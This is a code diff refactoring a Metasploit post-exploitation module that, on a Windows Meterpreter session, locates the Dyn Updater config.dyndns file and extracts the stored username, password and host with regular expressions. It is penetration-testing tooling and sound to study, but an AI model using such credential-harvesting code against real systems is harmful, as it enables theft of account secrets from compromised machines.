@@ -4,6 +4,7 @@
 ##
 
 class MetasploitModule < Msf::Post
+  include Msf::Post::File
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -24,6 +25,11 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -44,25 +50,19 @@ class MetasploitModule < Msf::Post
   # Return the config file path, otherwise nil to indicate nothing was found
   #
   def get_config_file
-    config_paths =
-      [
-        'C:\\ProgramData\\Dyn\\Updater\\', # Vista
-        'C:\\Documents and Settings\\All Users\\Application Data\\Dyn\\Updater\\' # XP and else
-      ]
+    config_paths = [
+      'C:\\ProgramData\\Dyn\\Updater\\config.dyndns', # Vista
+      'C:\\Documents and Settings\\All Users\\Application Data\\Dyn\\Updater\\config.dyndns' # XP and earlier
+    ]
 
-    # Give me the first match
-    config_file = nil
-    config_paths.each do |p|
-      tmp_path = p + 'config.dyndns'
-      begin
-        f = session.fs.file.stat(tmp_path)
-        config_file = tmp_path
-        break # We've found a valid one, break!
-      rescue StandardError
-      end
+    # Return the first match
+    config_paths.each do |path|
+      return path if exists?(path)
     end
 
-    return config_file
+    nil
+  rescue StandardError
+    nil
   end
 
   #
@@ -84,7 +84,6 @@ class MetasploitModule < Msf::Post
   #
   def parse_config(content)
     # Look at each line for user/pass/host
-    config_data = {}
     user = content.scan(/Username=([\x21-\x7e]+)/)[0][0]
     pass = content.scan(/Password=([\x21-\x7e]+)/)[0][0]
     host = content.scan(/Host\d=([\x21-\x7e]+)/)[0]
